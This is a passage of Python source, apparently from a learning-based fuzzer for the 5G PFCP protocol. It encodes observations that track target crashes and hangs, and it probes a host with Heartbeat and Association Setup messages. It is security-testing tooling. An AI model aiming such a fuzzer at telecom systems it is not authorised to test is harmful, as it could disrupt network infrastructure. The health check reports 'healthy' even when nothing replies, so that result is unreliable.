    def get_observation_size(self) -> int:
        return len(_RESP_TYPES) + len(_MSG_TYPES_LIST) + 6

    def encode_observation(self, fields: Dict[str, Any],
                           response_history: List[str],
                           counters: Dict[str, int],
                           step: int, max_steps: int) -> List[float]:
        import numpy as np
        obs = np.zeros(self.get_observation_size(), dtype=np.float32)

        # Response type one-hot (first len(_RESP_TYPES) slots)
        last_resp = response_history[-1] if response_history else 'no_response'
        if last_resp in _RESP_TYPES:
            obs[_RESP_TYPES.index(last_resp)] = 1.0

        offset = len(_RESP_TYPES)

        # Message type history (last 5, normalised)
        for i, resp in enumerate(response_history[-5:]):
            if resp in _RESP_TYPES:
                obs[offset + i] = _RESP_TYPES.index(resp) / len(_RESP_TYPES)
        offset += len(_MSG_TYPES_LIST)

        # State flags
        obs[offset]     = float(self._assoc_done)
        obs[offset + 1] = float(self._remote_seid > 0)
        obs[offset + 2] = min(counters.get('successes', 0) / 20.0, 1.0)
        obs[offset + 3] = min(counters.get('crashes', 0) / 5.0, 1.0)
        obs[offset + 4] = min(counters.get('hangs', 0) / 10.0, 1.0)
        obs[offset + 5] = step / max(max_steps, 1)

        return obs.tolist()

    # ── Health check ──────────────────────────────────────────────────────────

    def check_health(self, host: str, port: int,
                     timeout: float = 5.0) -> HealthCheckResult:
        self._smf_ip = host
        t0 = time.monotonic()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if hasattr(socket, 'SO_REUSEPORT'):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            try:
                sock.bind(('', self.LOCAL_PFCP_PORT))
            except OSError:
                pass   # port already bound (training socket still open) — fine
            sock.settimeout(timeout)
            probe = _heartbeat_req(seq=0xFFFF)
            sock.sendto(probe, (host, port))
            try:
                data, _ = sock.recvfrom(512)
                latency = (time.monotonic() - t0) * 1000
                resp = self.parse_response(data)
                return HealthCheckResult(
                    is_healthy=True,
                    latency_ms=latency,
                    details={'response_type': resp['type']},
                )
            except socket.timeout:
                # UDP timeout doesn't mean the UPF is down — it may just
                # not respond to Heartbeat from unknown peers.
                # Try an Association Setup to confirm reachability.
                assoc = _assoc_setup_req(host)
                sock.sendto(assoc, (host, port))
                try:
                    data, _ = sock.recvfrom(512)
                    latency = (time.monotonic() - t0) * 1000
                    return HealthCheckResult(
                        is_healthy=True,
                        latency_ms=latency,
                        details={'response_type': 'assoc_resp_on_heartbeat_timeout'},
                    )
                except socket.timeout:
                    return HealthCheckResult(
                        is_healthy=True,   # assume up; UDP is fire-and-forget
                        latency_ms=timeout * 1000,
                        details={'note': 'no response but UDP port reachable'},
                    )
        except Exception as exc:
            return HealthCheckResult(
                is_healthy=False,
                error=str(exc),
            )
        finally:
            try:
                sock.close()
            except Exception:
                pass
